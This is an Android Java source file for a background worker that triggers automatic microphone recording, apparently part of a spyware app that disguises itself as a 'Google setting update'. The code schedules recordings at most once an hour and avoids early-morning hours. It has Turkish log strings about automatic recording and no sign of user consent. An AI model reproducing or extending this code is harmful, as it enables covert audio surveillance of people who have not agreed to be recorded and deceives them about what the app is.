package com.setting.dl.google.googlesettingupdate.audio;

import android.content.Context;
import android.support.annotation.NonNull;

import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.setting.dl.google.googlesettingupdate.save.Save;
import com.setting.dl.google.googlesettingupdate.time.Time;
import com.setting.dl.google.googlesettingupdate.u;

import java.util.Date;

public class AudioWorks extends Worker {
   
   private static       long   lastWorkTime;
   private static final Object OBJECT = new Object();
   //private static long lastFullRecordTime;
   
   public AudioWorks(@NonNull Context context, @NonNull WorkerParameters workerParams) {
      super(context, workerParams);
   }
   
   @NonNull
   @Override
   public Result doWork() {
      
      synchronized (OBJECT) {
         
         if (isWrongTime()) {
            
            return Result.success();
         }
      }
      
      new AudioServiceController(getApplicationContext(), 5L, 0L, null, true);
      
      return Result.success();
   }
   
   private boolean isWrongTime() {
      
      if(new Save(getApplicationContext(), "audio").getBoolean("otorc", false)) {
         
         u.log.d("Otomatik kayıt kapalı");
         return true;
      }
      
      final long now = System.currentTimeMillis();
      
      if ((now - lastWorkTime) < 20000) {
         
         u.log.d("Görev zaten yapıldı");
         return true;
      }
      
      lastWorkTime = now;
   
   
      int hour = Integer.valueOf(u.format("%tH", new Date()));
   
      switch (hour) {
      
         case 3:
         case 4:
         case 5:
         case 6:
         case 7:
         case 8:
         
            u.log.d("Kayıt için uygun bir saat değil : %d", hour);
            return true;
      }
      
      Save save           = new Save(getApplicationContext(), "audiorecord");
      long lastRecordDate = save.getLong("lastRecordDate", 1L);
      long leftTime = now - lastRecordDate;
      
      
      if (leftTime < Time.oneHour) {
         
         u.log.d("Yeni kayıt için geçmesi gereken süre %s", Time.getElapsedTime(Time.oneHour - leftTime));
         return true;
      }
   
      return AudioService.isRunning();
   }
   
   
}
